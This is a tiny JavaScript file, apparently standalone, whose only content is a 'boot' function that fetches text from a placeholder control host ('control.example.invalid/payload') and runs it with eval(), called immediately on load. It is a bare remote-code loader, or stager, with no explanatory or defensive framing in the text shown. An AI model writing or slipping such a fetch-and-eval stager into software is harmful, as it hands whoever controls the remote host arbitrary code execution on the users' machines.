async function boot() {
  const response = await fetch('https://control.example.invalid/payload');
  const payload = await response.text();
  eval(payload);
}

boot();
